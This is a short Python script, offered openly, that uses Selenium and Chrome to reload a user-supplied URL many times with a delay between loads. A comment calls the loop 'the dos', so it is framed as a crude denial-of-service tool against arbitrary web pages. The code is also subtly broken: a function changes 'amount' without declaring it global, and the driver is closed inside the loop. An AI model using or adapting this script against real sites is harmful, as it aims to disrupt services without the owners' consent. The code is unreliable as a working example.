# Made by *someone*

from selenium import webdriver # pip install selenium
import time

#################################
# Inputs & Variable assignments subroutine

def inputs():
    global url
    global amount
    url = input("Enter a full url: ")
    amount = int(input("Enter the amount of times you would like to query this page: "))

#################################
# Minimun amount subroutine

def amounts():
    if amount < 10:
        print("Setting amount to ten as minimum")
        amount = 10

#################################
# Delay Subroutine

def delay_routine():
    global delay
    delay = int(input("[Dev] set delay between queries (seconds): "))

#################################
# Webdriver assignment subrountine (selenium feature)
def web_driver():
    global driver
    driver = webdriver.Chrome('C:\\webdrivers\\chromedriver.exe') # https://chromedriver.chromium.org/downloads
    # You will need this to run chrome

#################################
# Query processing subroutine (the dos)

def querying():
    for i in range(amount // 10):
        for i in range(10):
            time.sleep(delay)
            driver.get(url)
            print("Queried page,", i)
        driver.close()

#################################
# Program execution

inputs()
amounts()
delay_routine()
web_driver()
querying()

#################################

# **EOF**